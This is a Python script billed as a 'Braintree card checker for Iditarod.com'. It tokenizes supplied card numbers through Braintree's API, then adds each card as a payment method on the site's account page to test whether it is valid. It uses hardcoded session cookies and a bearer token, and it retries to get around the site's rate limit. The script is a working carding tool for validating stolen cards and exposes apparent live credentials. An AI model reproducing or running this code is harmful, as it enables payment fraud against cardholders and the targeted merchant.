import requests
import random
import time
from bs4 import BeautifulSoup

# ===== PROXY CONFIGURATION =====
PROXIES = [
    # No proxy for braintree
    {}
]

def get_random_proxy():
    """Get a random proxy from the list"""
    return random.choice(PROXIES)

def make_request_with_proxy(func, *args, max_retries=3, **kwargs):
    """
    Make a request with proxy rotation and retry logic
    """
    proxies_tried = set()
    last_error = None
    
    for attempt in range(max_retries):
        try:
            # Get a proxy that hasn't been tried
            available_proxies = [p for p in PROXIES if str(p) not in proxies_tried]
            if not available_proxies:
                available_proxies = PROXIES  # Reset if all tried
            
            proxy = random.choice(available_proxies)
            proxies_tried.add(str(proxy))
            
            # Add proxy to kwargs if not already present
            kwargs_with_proxy = kwargs.copy()
            if 'proxies' not in kwargs_with_proxy and proxy:
                kwargs_with_proxy['proxies'] = proxy
            
            # Make the request
            response = func(*args, **kwargs_with_proxy)
            
            # Check for "too soon" error in response
            if hasattr(response, 'text'):
                if "You cannot add a new payment method so soon after the previous one" in response.text:
                    print("⚠️ Detected 'too soon' error. Waiting 20 seconds...")
                    time.sleep(20)
                    continue  # Retry with same card
            
            return response
            
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
                requests.exceptions.Timeout, requests.exceptions.SSLError) as e:
            last_error = e
            print(f"⚠️ Proxy error on attempt {attempt + 1}: {str(e)}")
            
            if attempt < max_retries - 1:
                wait_time = 2 * (attempt + 1)  # Exponential backoff
                time.sleep(wait_time)
                continue
    
    # If all retries failed
    raise last_error if last_error else Exception("All proxy attempts failed")

def check_card_braintree_iditarod(cc, mm, yy, cvc):
    """Braintree card checker for Iditarod.com with proxy support"""
    if len(mm) == 1: mm = "0" + mm
    if len(yy) == 2: yy = "20" + yy

    session = requests.Session()
    session.headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    try:
        # First, get the bearer token for Braintree API with proxy
        print("Getting bearer token with proxy...")
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': 'Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjQ4NTQ1NjIsImp0aSI6IjNkZTBmZmUxLWFlZmItNGMxMC1iODRhLTA0ZGY5Mzc4OThjNiIsInN1YiI6IjZ5ZHZmZG01Y3NiM2o3MjUiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjZ5ZHZmZG01Y3NiM2o3MjUiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7fX0.Iazv-f_NIoEV5-ToT3_Zx4dKC648OXzmLDElZ8d6ZQjjaAIhQdYpzXzp4mUOuvtpHjK_ZkYFDxZ1wk9V50tHlA',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.83 Mobile Safari/537.36'
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '094388ea-2f93-44c1-b9ea-f76f35c4952e',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        print("Tokenizing card with Braintree (with proxy)...")
        
        # Use proxy for Braintree request
        response = make_request_with_proxy(
            requests.post,
            'https://payments.braintree-api.com/graphql',
            headers=headers,
            json=json_data,
            timeout=30
        )
        
        if response.status_code != 200:
            return {"status": "error", "message": f"Braintree tokenization failed: {response.status_code}"}
        
        data = response.json()
        if 'errors' in data:
            error = data['errors'][0]['message'] if data['errors'] else 'Tokenize failed'
            return {"status": "error", "message": error}
        
        token = data['data']['tokenizeCreditCard']['token']
        print(f"Got token: {token[:20]}...")

        # Now add payment method to Iditarod.com with proxy
        print("Adding payment method to Iditarod.com (with proxy)...")
        cookies = {
            '_ga': 'GA1.1.123210276.1764665940',
            '_fbp': 'fb.1.1764665940215.40181429218332037',
            'cookieconsent_status': 'dismiss',
            'wordpress_logged_in_8fb226385f454fe1b19f20c68cef99ad': 'pythonsame5332%7C1765876294%7C5jtJY7DfmSKDFSGchW9mwMaevRLbI6N7trI6FVjf2YZ%7C9071ee0fab799347c72e10860d3ffd83c5efaefcf2d26591a3380e036bbe0b81',
            'PHPSESSID': 'etd9h3sfv5mpueitb332kthfi6',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-12-03%2012%3A39%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Fiditarod.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2025-12-03%2012%3A39%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Fiditarod.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36',
            'mailpoet_page_view': '%7B%22timestamp%22%3A1764768128%7D',
            'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fiditarod.com%2Fmy-account%2Fadd-payment-method%2F',
            '_ga_GEWJ0CGSS2': 'GS2.1.s1764767393$o3$g1$t1764768415$j60$l0$h1224012360',
        }

        headers = {
            'authority': 'iditarod.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://iditarod.com',
            'referer': 'https://iditarod.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        }

        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': '34cfbd4a64',
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        # Use proxy for site request
        response = make_request_with_proxy(
            session.post,
            'https://iditarod.com/my-account/add-payment-method/',
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=45
        )
        
        text = response.text
        
        # Parse response
        soup = BeautifulSoup(text, 'html.parser')
        
        # Check for success (redirection to payment methods page)
        if 'Payment Methods' in text and 'payment-methods' in text:
            return {"status": "approved", "message": "Payment method added successfully"}
        
        # Check for "too soon" error
        if "You cannot add a new payment method so soon after the previous one" in text:
            return {"status": "retry", "message": "You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds."}
        
        # Check for error messages
        error_elements = soup.select('ul.woocommerce-error li')
        if error_elements:
            error_messages = [error.get_text(strip=True) for error in error_elements]
            return {"status": "declined", "message": error_messages[0] if error_messages else "Unknown error"}
        
        # Check for success messages
        success_elements = soup.select('ul.woocommerce-message li')
        if success_elements:
            success_messages = [success.get_text(strip=True) for success in success_elements]
            return {"status": "approved", "message": success_messages[0] if success_messages else "Payment method added"}
        
        return {"status": "unknown", "message": "Unknown response from Iditarod.com"}

    except requests.exceptions.Timeout:
        return {"status": "error", "message": "Request timeout"}
    except requests.exceptions.ConnectionError:
        return {"status": "error", "message": "Connection error"}
    except Exception as e:
        return {"status": "error", "message": f"Error: {str(e)[:100]}"}

def check_card_braintree_iditarod_with_retry(cc, mm, yy, cvc, max_retries=3):
    """
    Check card with retry logic for "too soon" errors
    """
    for attempt in range(max_retries):
        print(f"Card check attempt {attempt + 1}/{max_retries}")
        
        result = check_card_braintree_iditarod(cc, mm, yy, cvc)
        
        # Check if we need to retry due to "too soon" error
        if result["status"] == "retry":
            if attempt < max_retries - 1:
                wait_time = 20 + (attempt * 5)  # 20, 25, 30 seconds
                print(f"⚠️ 'Too soon' error detected. Waiting {wait_time} seconds before retry...")
                time.sleep(wait_time)
                continue
            else:
                result["message"] = "Failed after multiple retries: " + result["message"]
                return result
        
        # If not a "too soon" error, return immediately
        return result
    
    return {"status": "error", "message": "Max retries exceeded"}

